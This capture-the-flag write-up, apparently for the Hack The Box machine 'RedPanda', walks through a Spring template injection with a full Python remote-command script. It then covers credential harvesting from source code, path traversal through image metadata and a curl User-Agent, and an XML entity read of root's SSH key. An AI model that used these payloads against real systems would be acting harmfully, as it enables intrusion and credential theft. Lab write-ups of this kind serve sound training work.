We start scanning ports with nmap

<img src= "/writeimgs/redpanda/red1.png">


Once the port scan is done, we observe that on port 8080, they have a website, we enter there and find a nice search engine for pandas:

If we use the whatweb command, we can observe the technology that the web has:

Knowing this we can use an example of <A HREF="https://github.com/swisskyrepo/PayloadsAllTheThings"> PayloadsAllTheThings </A> but it blocks the $

However, we can use * which works in the same way.

<img src= "/writeimgs/redpanda/red5.png/">

To perform this process in an automatic and simple way, we can use the following script:

```ruby
#!/usr/bin/python3
import requests
from cmd import Cmd
from bs4 import BeautifulSoup

class RCE(Cmd):
    prompt = "\033[1;31m$\033[1;37m "
    def decimal(self, args):
        comando = args
        decimales = []

        for i in comando:
            decimales.append(str(ord(i)))
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % decimales[0]

        for i in decimales[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"
        data = { "name": payload }
        requer = requests.post("http://10.10.11.170:8080/search", data=data)
        parser = BeautifulSoup(requer.content, 'html.parser')
        grepcm = parser.find_all("h2")[0].get_text()
        result = grepcm.replace('You searched for:','').strip()
        print(result)

    def default(self, args):
        try:
            self.decimal(args)
        except:
            print("%s: command not found" % (args))

RCE().cmdloop()
```

We use the above mentioned script and get the user flag!

After searching through directories for a while we found credentials in MainController.java.

<img src= "/writeimgs/redpanda/red8.png/">

We can use these credentials to connect via ssh:

<img src= "/writeimgs/redpanda/red9.png/">

We will try to use the pspy to see what is running behind, for that we download it and upload it with:

<b> <i>scp pspy64 woodenk@10.10.11.170:/home/woodenk</i></b>

<img src= "/writeimgs/redpanda/red10.png/">

Once pspy is uploaded, we give it permissions and run it:

<img src= "/writeimgs/redpanda/red11.png/">

If we look with pspy at the system tasks, we see that root runs a script like woodenk.

<img src= "/writeimgs/redpanda/red12.png/">

This may be a clue to be able to scale, because why, would you delete files with that extension? Reviewing again the file where we found credentials we see how it exports the xml.

<img src= "/writeimgs/redpanda/red13.png/">

Also in another App.java file we can see how it handles the metadata, now it starts to make sense that it will delete files with those extensions, but also in the file it shows us how it handles the User-Agent.

Looking at this configuration we can inject in the "Artist" field, a path where the xml will be, this in any image that later we will upload to the machine.

<img src= "/writeimgs/redpanda/red14.png/">

Next we will create in the home an xml file that points to the root id_rsa, this with the name defined in the image plus _creds.xml.

<img src= "/writeimgs/redpanda/red15.png/">

Now we have to make a curl request with the format we saw in the file as User-Agent.

<p> curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/gato.jpg" </p>

<img src= "/writeimgs/redpanda/red16.png/">

Finally we will export the xml from /stats to take our file.

<img src= "/writeimgs/redpanda/red17.png/">

<img src= "/writeimgs/redpanda/red18.png/">

After a few seconds if we check the xml it will have the root id_rsa.

<img src= "/writeimgs/redpanda/red19.png/">

Now with this id_rsa, we can finally connect via ssh as root and get the much desired flag!
